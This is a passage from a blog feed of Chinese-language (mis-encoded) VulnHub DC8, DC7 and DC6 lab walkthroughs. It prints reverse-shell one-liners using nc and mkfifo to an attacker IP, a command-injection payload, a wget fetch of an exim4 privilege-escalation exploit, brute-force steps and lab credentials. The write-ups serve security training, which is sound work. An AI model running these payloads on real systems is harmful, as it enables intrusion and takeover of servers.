alt="image-20230414153441690"></p><p>å‘ç°shellåå¼¹æˆåŠŸ</p><p><strong>(è¿™é‡Œèƒ½åå¼¹æˆåŠŸæ˜¯å› ä¸ºåœ¨æäº¤contact usæˆåŠŸåä¼šå¼¹å‡ºä¸€ä¸ªä¸€ä¸ªhtmlé¡µé¢å†…å®¹ï¼Œç„¶åæˆ‘ä»¬åœ¨é‡Œé¢ä¿®æ”¹ä¸ºphpcodeï¼Œå¹¶ä¸”å†…å®¹æ·»åŠ äº†shellï¼Œæ‰€ä»¥å°±èƒ½åå¼¹æˆåŠŸ)</strong></p><p>python shelläº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯ææƒäº†</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¿˜æ˜¯åˆ©ç”¨è¿™å‡ ä¸ªæ–¹æ³•  suid sudo å†…æ ¸ææƒ</p><p><strong>sudo -l æ‰¾ä¸åˆ°ä¸œè¥¿</strong></p><p>å°è¯•ä¸€ä¸‹suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414154016149.png" alt="image-20230414154016149"></p><p>å‘ç°ä¸€ä¸ªæ–°ä¸œè¥¿ï¼Œäºæ˜¯å°±çœ‹ä¸‹ä»–å¯ä¸å¯ä»¥è¿›è¡Œææƒ</p><p>æ‰¾åˆ°ä¸€ä¸ªexim4å‘½ä»¤ï¼Œeximæ˜¯ä¸€æ¬¾åœ¨<strong>Unixç³»ç»Ÿä¸Šä½¿ç”¨çš„é‚®ä»¶æœåŠ¡</strong>ï¼Œexim4åœ¨ä½¿ç”¨æ—¶å…·æœ‰rootæƒé™</p><p>äºæ˜¯å°±å»<code>searchsploit</code>æŸ¥æ‰¾ä¸€ä¸‹çœ‹ä»–æœ‰æ²¡æœ‰æ¼æ´</p><p><img src="../images/image-20230414154330691.png" alt="image-20230414154330691"></p><p>å‘ç°å­˜åœ¨æœ¬åœ°ææƒæ¼æ´</p><p>ä½†æ˜¯ä¸çŸ¥é“æ˜¯å“ªä¸ªç‰ˆæœ¬ï¼Œäºæ˜¯å°±å»æ‰€å±ç›®å½•è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230414154735143.png" alt="image-20230414154735143"></p><p>å‘ç°ç‰ˆæœ¬ï¼Œäºæ˜¯å°±å»è¯»å–<code>searchsplot</code>ç»™çš„æ–‡ä»¶å†…å®¹</p><p><img src="../images/image-20230414155000270.png" alt="image-20230414155000270"></p><p>ç„¶åæŠŠ<code>46996.sh</code>æ‹·è´åˆ°æœ¬åœ°å¹¶æ”¹åä¸º<code>666.sh</code>ï¼Œå¹¶åœ¨kaliå¼€å¯httpæœåŠ¡ <code>service apache2 start</code></p><p>è¿™é‡Œå¼€å¯æœåŠ¡çš„åŸå› æ˜¯ä¸ºäº†èƒ½æŠŠæœ¬åœ°çš„ææƒæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬åˆ›å»ºç½‘ç«™ï¼Œç„¶åè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨wgetä¸Šä¼ ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">1.å¯ä»¥ä½¿ç”¨pythonåˆ›å»ºä¸´æ—¶ç½‘ç«™</span><br><span class="line"></span><br><span class="line">2.ä½¿ç”¨Apacheä¹‹ç±»çš„</span><br><span class="line"></span><br><span class="line">å› ä¸ºæˆ‘ä»¬è¿™é‡Œæœ‰apacheå°±ä¸ä½¿ç”¨pythonäº†ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//å°†expç›´æ¥å¤åˆ¶åˆ°ï¼Œç½‘ç«™æ ¹ç›®å½•ä¸‹é¢</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html/1.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//è¿™é‡Œæˆ‘ä»¬æ¥åˆ°/tmpç›®å½•ä¸‹é¢ï¼Œå› ä¸ºå…¶ä»–ç›®å½•é€šå¸¸ä¼šæ²¡æœ‰æƒé™</span><br><span class="line">//ç„¶åwgetä¸‹è½½,è¿™é‡Œè¦çœ‹è‡ªå·±çš„ipå’Œæ–‡ä»¶å</span><br><span class="line">wget http://192.168.1.12/1.sh</span><br><span class="line"> </span><br><span class="line">//ç»™æƒé™</span><br><span class="line">chmod 777 1.sh </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414160151191.png" alt="image-20230414160151191"></p><p>ä¸Šä¼ æˆåŠŸ</p><p>ç„¶åæŸ¥çœ‹æ–‡ä»¶ï¼Œæ ¹æ®æ–‡ä»¶é‡Œçš„æ–¹æ³•è¿›è¡Œææƒ</p><p><img src="../images/image-20230414160501356.png" alt="image-20230414160501356"></p><p>å‘ç°ä¸Šé¢çš„ä¸è¡Œåï¼Œæˆ‘ä»¬æ¢å¦ä¸€ç§æ–¹æ³•</p><p>æ–‡ä»¶é‡Œæœ‰å¥½å‡ ç§æ–¹æ³•ï¼Œå¯ä»¥è‡ªå·±è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230414160717547.png" alt="image-20230414160717547"></p><p><img src="../images/image-20230414160818299.png" alt="image-20230414160818299"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ç„¶ååœ¨5ç§’åè¾“å…¥</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">ä»–å°±ä¼šç›´æ¥è·³è½¬åˆ°root</span><br><span class="line"></span><br><span class="line">æ³¨æ„è¿™ä¸ªæ˜¯æœ‰æ—¶é—´é™åˆ¶çš„</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414160847635.png" alt="image-20230414160847635"></p><p>æ‹¿ä¸‹</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC7</title>
      <link href="/posts/5420f652.html"/>
      <url>/posts/5420f652.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ€»ç»“ï¼š<a href="https://so.csdn.net/so/search?q=ç¤¾å·¥&amp;spm=1001.2101.3001.7020">ç¤¾å·¥</a>å°è¯•</strong></p><p>å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœº</p><p><img src="../images/image-20230413111626730.png" alt="image-20230413111626730"></p><p>ç„¶åæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230413111722488.png" alt="image-20230413111722488"></p><p>åªæœ‰ä¸¤ç«¯å£æ˜¯å¼€æ”¾çš„  80    22 </p><p><img src="../images/image-20230413111858833.png" alt="image-20230413111858833"></p><p>ç†Ÿæ‚‰çš„drupalæ¡†æ¶ï¼Œåªä¸è¿‡è¿™ä¸ªç‰ˆæœ¬æ¯”è¾ƒæ–°ï¼Œä¹‹å‰å­˜åœ¨æ¼æ´çš„æ˜¯7</p><p>msfæ‰¾ä¸åˆ°</p><p>ç„¶åå°è¯•ä¸€ä¸‹<code>searchsploit</code>å·¥å…·ï¼Œå‘ç°æ˜¯æ‰¾åˆ°çš„æ¼æ´ç‰ˆæœ¬éƒ½å¤ªæ–°ï¼Œä¸é€‚åˆ</p><p><img src="../images/image-20230413112735971.png" alt="image-20230413112735971"></p><p>ç„¶åæ‰«ç›®å½•</p><p>sqlmap  å°è¯•åéƒ½æ— æœ  æœ€ååç¿»è¯‘äº†ä¸€ä¸‹ç½‘ç«™ç»™çš„è¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DC-7å¼•å…¥äº†ä¸€äº›â€œæ–°â€æ¦‚å¿µï¼Œä½†æˆ‘å°†ç•™ç»™ä½ ä»¬å»å¼„æ¸…æ¥šå®ƒä»¬æ˜¯ä»€ä¹ˆã€‚ï¼š-ï¼‰</span><br><span class="line">è™½ç„¶è¿™ä¸ªæŒ‘æˆ˜å¹¶ä¸å®Œå…¨æ˜¯æŠ€æœ¯æ€§çš„ï¼Œä½†å¦‚æœä½ éœ€è¦è¯‰è¯¸æš´åŠ›æˆ–å­—å…¸æ”»å‡»ï¼Œä½ å¯èƒ½ä¸ä¼šæˆåŠŸã€‚</span><br><span class="line">ä½ è¦åšçš„æ˜¯è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚åœ¨ç›’å­å¤–é¢ã€‚ï¼š-ï¼‰</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413113004345.png" alt="image-20230413113004345"></p><p>å‘ç°å­˜åœ¨ä¹Ÿè¯¥ä¸€ä¸ªç©æ„ï¼Œäºæ˜¯å°è¯•å»ç½‘ä¸Šè¿›è¡Œæœç´¢å‘ç°äº†ä¸€ä¸ªgithubåœ°å€</p><p><img src="../images/image-20230413113123298.png" alt="image-20230413113123298"></p><p>å‘ç°è¿™ä¸ªgithubåœ°å€</p><p>äºæ˜¯æŸ¥çœ‹é…ç½®æ–‡ä»¶å‘ç°</p><p><img src="../images/image-20230413113144350.png" alt="image-20230413113144350"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯å¯ä»¥å°è¯•æ•°æ®åº“è¿æ¥æˆ–è€…sshè¿æ¥ï¼Œçœ‹å“ªä¸ªèƒ½æˆåŠŸ</p><p><img src="../images/image-20230413113616668.png" alt="image-20230413113616668"></p><p>sshç™»å½•æˆåŠŸ</p><p><img src="../images/image-20230413113653632.png" alt="image-20230413113653632"></p><p>å‘ç°å­˜åœ¨åŠ å¯†æ–‡ä»¶</p><p><strong>lsä¸€ä¸‹çœ‹è§äº†ä¸¤ä¸ªæ–‡ä»¶ ä¸€ä¸ª<code>backups</code> ä¸€ä¸ª<code>mobx</code>è¿›å…¥<code>backups</code>æ–‡ä»¶å¤¹ï¼Œå‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œ<code>gpg</code>åç¼€çš„ï¼ï¼ï¼ç¬¬ä¸€æ¬¡è§ ç™¾åº¦ä¸€ä¸‹çœ‹çœ‹<br><code>gpg</code>æ˜¯ä¸€ç§åŸºäºå¯†é’¥çš„åŠ å¯†æ–¹å¼ï¼Œä½¿ç”¨äº†ä¸€å¯¹å¯†é’¥å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œæ¥ä¿è¯æ¶ˆæ¯çš„å®‰å…¨ä¼ è¾“æ ¼å¼æ˜¯ç”¨æ¥åŠ å¯†æ–‡ä»¶çš„ã€‚</strong></p><p><img src="../images/image-20230413113924613.png" alt="image-20230413113924613"></p><p><strong>ç„¶åå†çœ‹ä¸€ä¸‹ <code>mbox</code> æ–‡ä»¶ <code>cat mbox</code> å‘ç°åœ¨<code>/opt/scripts/</code> æœ‰ä¸ªå¯ä»¥æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ <code>backups.sh</code></strong></p><p><img src="../images/image-20230413114040196.png" alt="image-20230413114040196"></p><p><strong>å‘ç°äº†<code>drush</code> ä»€ä¹ˆæ˜¯drushï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ ç»è¿‡ç™¾åº¦æŸ¥é˜…å‘ç°<code>drush</code> æ˜¯<code>drupal shell</code> ä¸“é—¨ç®¡ç†<code>drupal</code>ç«™ç‚¹çš„<code>shell</code></strong></p><p><strong>è¿›å…¥åˆ°<code>/var/www/html</code>ç›®å½•ä¸‹ï¼Œä½¿ç”¨<code>drush</code>å‘½ä»¤ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ä¸º<code>123456</code>ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸï¼ï¼ï¼</strong></p><p><img src="../images/image-20230413114909163.png" alt="image-20230413114909163"></p><p>ä¿®æ”¹æˆåŠŸ</p><p>ä½†æ˜¯ç™»ä¸è¿›å»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush php-eval &#x27;db_query(&quot;DELETE FROM flood&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>å…ˆä¿®æ”¹å¯†ç   åœ¨æ‰§è¡Œè¿™ä¸ªè¯­å¥æ‰èƒ½ç™»å½•è¿›å»</p><p><img src="../images/image-20230413115924584.png" alt="image-20230413115924584"></p><p>è¿›å…¥åå°å  éœ€è¦æ‰¾ä¸€ä¸‹å“ªèƒ½è¿›è¡Œæ¼æ´åˆ©ç”¨</p><p><strong>åœ¨Contentâ€”&gt;Add contentâ€“&gt;Basic pageä¸‹</strong> </p><p>å› ä¸ºè¿™é‡Œå¯ä»¥å†™æ–‡ä»¶ï¼Œç„¶åå°±å¯ä»¥å†™æœ¨é©¬ï¼Œç„¶åè¿›è¡Œä¸Šä¼ ï¼Œç„¶åæˆ‘ä»¬æ‰¾åˆ°ä¸Šä¼ åœ°å€ï¼Œç„¶åè®¿é—®ä¸Šä¼ æ–‡ä»¶å°±å¯ä»¥åˆ©ç”¨shelläº†</p><p><img src="../images/image-20230413120811600.png" alt="image-20230413120811600"></p><p>ä½†æ˜¯è¿™é‡Œæ²¡æœ‰phpæ¨¡æ¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¾—è‡ªå·±è£…ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/php  # æ’ä»¶ä¸‹è½½åœ°å€</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz #æ¨¡å—åŒ…</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413160601781.png" alt="image-20230413160601781"></p><p>ä¸Šä¼ æˆåŠŸåï¼Œè¿›è¡Œåå¼¹shell</p><p><img src="../images/image-20230413160705537.png" alt="image-20230413160705537"></p><p>åå¼¹æˆåŠŸï¼Œè¿›è¡Œäº¤äº’shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å°è¯•è¿›è¡Œææƒäº†  </p><p>å°±æ˜¯åˆ©ç”¨ä¹‹å‰å‘ç°çš„ä¸€ä¸ªshæ–‡ä»¶æ¥è¿›è¡Œææƒ</p><p><img src="../images/image-20230413192501447.png" alt="image-20230413192501447"></p><p>å› ä¸ºæ–‡ä»¶é‡Œçš„å†…å®¹æ˜¯è¿™æ ·çš„  <code>rm xxxx</code>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ä¸€ä¸‹ä½¿ç”¨<strong>rm</strong>æ¥è¿›è¡Œåå¼¹shellåˆ©ç”¨è¿™ä¸ªè„šæœ¬åå¼¹shellä¹‹åå°±æ˜¯rootæƒé™äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.142.129 7777 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>æ·»åŠ å•çº¯çš„<strong>ncåå¼¹shell</strong>ä¹Ÿè¡Œ  ä¸ç”¨rmä¹Ÿè¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash/ 192.168.202.129 1234&quot; &gt;&gt;backups.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC6</title>
      <link href="/posts/2327c6c4.html"/>
      <url>/posts/2327c6c4.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ€»ç»“:wpscançˆ†ç ´ï¼Œ<a href="https://so.csdn.net/so/search?q=nmap&amp;spm=1001.2101.3001.7020">nmap</a>ææƒ</strong></p><p>å‘ç°é¶æœºip</p><p><img src="../images/image-20230413100512563.png" alt="image-20230413100512563"></p><p>æ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230413100554636.png" alt="image-20230413100554636"></p><p>è¿˜æ˜¯ä¸¤ä¸ªæ­£å¸¸ç«¯å£  22å’Œ80</p><p>ç„¶åè®¿é—®80ç«¯å£</p><p><img src="../images/image-20230413100651538.png" alt="image-20230413100651538"></p><p>è®¿é—®ä¸äº†   ä½†å‡ºç°äº†ä¸€ä¸ªåŸŸå</p><p>çŒœæµ‹æ˜¯åŸŸåè§£æçš„é—®é¢˜</p><p>äºæ˜¯å°±å»ä¿®æ”¹ <code>/etc/hosts</code></p><p><img src="../images/image-20230413101135856.png" alt="image-20230413101135856"></p><p>ä¿®æ”¹åè®¿é—®æˆåŠŸï¼Œå‘ç°æ˜¯wordpressæ¡†æ¶çš„</p><p><img src="../images/image-20230413101154443.png" alt="image-20230413101154443"></p><p>äºæ˜¯å°±å¯ä»¥ä½¿ç”¨<code>wpscan</code>å·¥å…·è¿›è¡Œæ‰«æäº†  å…ˆæ‰«ä¸€ä¸‹ç½‘ç«™æœ‰å“ªäº›ç”¨æˆ·</p><p><code>wpscan --url -e</code> </p><p><img src="../images/image-20230413101443241.png" alt="image-20230413101443241"></p><p>å‘ç°å­˜åœ¨å¥½å‡ ä¸ªç”¨æˆ·</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•æ‰«ç›®å½•ï¼Œçœ‹èƒ½ä¸èƒ½æ‰«å‡ºåå°ç™»å½•åœ°å€æ¥</p><p><img src="../images/image-20230413101610519.png" alt="image-20230413101610519"></p><p>å‘ç°å­˜åœ¨ç±»ä¼¼åå°çš„ç›®å½•</p><p><img src="../images/image-20230413101640997.png" alt="image-20230413101640997"></p><p>æˆåŠŸå‘ç°åå°</p><p>è¿™é‡Œçš„è¯æ˜¯ä¸çŸ¥é“å¯†ç çš„  äºæ˜¯æˆ‘ä»¬å°±é€‰æ‹©è¿›è¡Œçˆ†ç ´</p><p>ä½†æ˜¯å¦‚æœè¿™é‡Œä½¿ç”¨çš„æ˜¯<strong>cewl</strong>æ ¹æ®è¿™ä¸ªç½‘ç«™ç”Ÿæˆçš„å¯†ç çš„è¯  ç„¶åä½¿ç”¨<strong>wpscan</strong>è¿›è¡Œçˆ†ç ´çš„è¯ï¼Œæ˜¯ä¸ä¼šæˆåŠŸçš„</p><p>å› ä¸ºç”Ÿæˆçš„å­—å…¸é‡Œæ²¡æœ‰é‚£ä¸ªå¯†ç </p><p><strong>(ä¸‹é¢è¿™ç§æ˜¯ä¸ä¼šæˆåŠŸçš„)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//æ ¹æ®ç½‘é¡µçš„å†…å®¹è¾“å‡ºä¸€ä¸ªå­—å…¸</span><br><span class="line">cewl https://www.wordy.com/ -w pass.txt</span><br><span class="line"> </span><br><span class="line">//ä½¿ç”¨å‘½ä»¤æšä¸¾è¿™ä¸ªç½‘ç«™çš„ç”¨æˆ·</span><br><span class="line">wpscan --url https://www.wordy.com/ -e u  #ä½¿ç”¨è¿™ä¸ªæ²¡æœ‰æšä¸¾æˆåŠŸ</span><br><span class="line">wpscan --url http://wordy/ -e u  #è¿™ä¸ªæˆåŠŸäº†ï¼Œæœ‰ç‚¹æƒ³ä¸æ˜ç™½</span><br><span class="line"> </span><br><span class="line">//å°†æšä¸¾å‡ºæ¥çš„å‡ ä¸ªç”¨æˆ·è¾“å…¥åˆ°user.txt</span><br><span class="line">echo &quot;admin\ngraham\nmark\nsarah\njens&quot; &gt; user.txt</span><br><span class="line"> </span><br><span class="line">//å°è¯•çˆ†ç ´å¯†ç </span><br><span class="line">wpscan --url wordy -U user.txt -P passwd.txt </span><br></pre></td></tr></table></figure><p><strong>å»çœ‹åˆ«äººçš„wpæ‰çŸ¥é“è¦ä½¿ç”¨/usr/share/wordlists/rockyou.txtä½œä¸ºå­—å…¸ï¼Œä½†æ˜¯è¿™ä¸ªå­—å…¸å¾ˆå¤§ï¼Œæˆ‘å°±å°†ä¸€äº›å…³äºå¯†ç çš„ä¸€äº›æå–åˆ°ä¸€ä¸ªå­—å…¸ä¸­ï¼Œè¿™æ—¶å€™æˆ‘å·²ç»çŸ¥é“å¯†ç æ˜¯helpdesk01äº†</strong></p><p><strong>æ³¨æ„ï¼šrockyou.txtå­—å…¸æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…éœ€è¦æˆ‘ä»¬è‡ªå·±è§£å‹ã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin\ngraham\nmark\nsarah\njens&quot; &gt; user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//æå–ç›¸å…³å¯†ç åˆ°ä¸€ä¸ªæ–°çš„å­—å…¸æ–‡ä»¶</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep help &gt; passwd.txt</span><br><span class="line"> </span><br><span class="line">//è¿™é‡Œé‡æ–°çˆ†ç ´</span><br><span class="line">wpscan --url wordy -U user.txt -P passwd.txt </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413103015685.png" alt="image-20230413103015685"></p><p>è¿™é‡Œçˆ†ç ´å‡ºæ¥äº†,<a href="http://wordy/wp-login.php">http://wordy/wp-login.php</a> åœ¨è¿™é‡Œç™»å½•</p><p><code>mark:helpdesk01</code></p><p><img src="../images/image-20230413103149712.png" alt="image-20230413103149712"></p><p>æˆåŠŸç™»å½•åå°</p><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>è¿™é‡Œçš„æ¼æ´æ‰§è¡Œå‘½ä»¤åœ¨è¿™é‡Œ</p><p><img src="../images/image-20230413103421863.png" alt="image-20230413103421863"></p><p><img src="../images/image-20230413103455979.png" alt="image-20230413103455979"></p><p><img src="../images/image-20230413103503477.png" alt="image-20230413103503477"></p><p>æˆåŠŸè¿›è¡Œäº†å‘½ä»¤æ‰§è¡Œ</p><p><img src="../images/image-20230413103535699.png" alt="image-20230413103535699"></p><p>å‘ç°å±…ç„¶æœ‰é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œçš„é•¿åº¦é™åˆ¶åªæœ‰å‰ç«¯æœ‰ï¼Œåç«¯æ²¡æœ‰ï¼Œäºæ˜¯æˆ‘ä»¬å°±å°è¯•ä¿®æ”¹ä¸€ä¸‹å‰ç«¯é™åˆ¶é•¿åº¦</p><p><img src="../images/image-20230413103828270.png" alt="image-20230413103828270"></p><p><strong>æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿›è¡ŒæŠ“åŒ…æ¥åŠè¿›è¡Œä¿®æ”¹</strong></p><p><img src="../images/image-20230413104209721.png" alt="image-20230413104209721"></p><p>è¿™é‡Œæ²¡æœ‰é•¿åº¦è¿›è¡Œé™åˆ¶</p><p>ç„¶åæˆ‘ä»¬å°±å°è¯•åå¼¹shellï¼Œæ‹¿åˆ°è¿™ä¸ªç½‘ç«™çš„æœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line"> </span><br><span class="line">//ä½¿ç”¨pythonæä¸€ä¸ªä¼ªshell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413104405636.png" alt="image-20230413104405636"></p><p>å¼¹ä¸Šå»äº†</p><p>ç„¶åè¿›è¡Œäº¤äº’shell</p><p><img src="../images/image-20230413104510719.png" alt="image-20230413104510719"></p><p>ç„¶åå°è¯•å¼€å§‹ææƒ</p><p><strong>suid sudo å†…æ ¸ææƒ</strong>  éƒ½è¯•äº†ä¸€éå‘ç°æ²¡å•¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æœ€ååœ¨ç”¨æˆ·çš„æ ¹ç›®å½•ä¸­å‘ç°äº†å¯ä»¥æ–‡ä»¶å¤¹ï¼Œ/home/mark/stuffä¸­å‘ç°ä¸€ä¸ªthings-to-do.txt</span><br><span class="line">è¿™é‡Œå‘ç°äº†grahamç”¨æˆ·çš„å¯†ç ,ç„¶åæˆ‘ä»¬é€šè¿‡suæ¥åˆ°grahamç”¨æˆ·ä¸­</span><br><span class="line">graham:GSo7isUM1D4</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413104651652.png" alt="image-20230413104651652"></p><p><strong>markç”¨æˆ·çš„è¯   sudo -l æŸ¥çœ‹æ—¶éœ€è¦å¯†ç çš„</strong></p><p>åœ¨è¿™é‡Œå‘ç°sudo -læ²¡æœ‰éœ€è¦å¯†ç ï¼Œè€Œä¸”è¿˜æœ‰ä¸œè¥¿ï¼Œè¿™é‡Œå»çœ‹çœ‹</p><p><img src="../images/image-20230413105147268.png" alt="image-20230413105147268"></p><p><strong>/<em>bin</em>/<em>bash</em> æ˜¯æŒ‡æ­¤è„šæœ¬ä½¿ç”¨/<em>bin</em>/<em>bash</em>æ¥è§£é‡Šæ‰§è¡Œï¼Œ#!æ˜¯ç‰¹æ®Šçš„è¡¨ç¤ºç¬¦ï¼Œå…¶åé¢æ ¹çš„æ˜¯æ­¤è§£é‡Šæ­¤è„šæœ¬çš„shellçš„è·¯å¾„</strong></p><p>å‘ç°ä¸ªå¯æ‰§è¡Œè„šæœ¬</p><p><img src="../images/image-20230413105734306.png" alt="image-20230413105734306"></p><p>äºæ˜¯æ·»åŠ /bin/bashè¿›å»æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//æ¥åˆ°ææƒæ–‡ä»¶é‚£é‡Œ</span><br><span class="line">cd /home/jens</span><br><span class="line"> </span><br><span class="line">//æ·»åŠ å¯ä»¥ææƒçš„ä¸œè¥¿</span><br><span class="line">echo &quot;/bin/bash&quot; 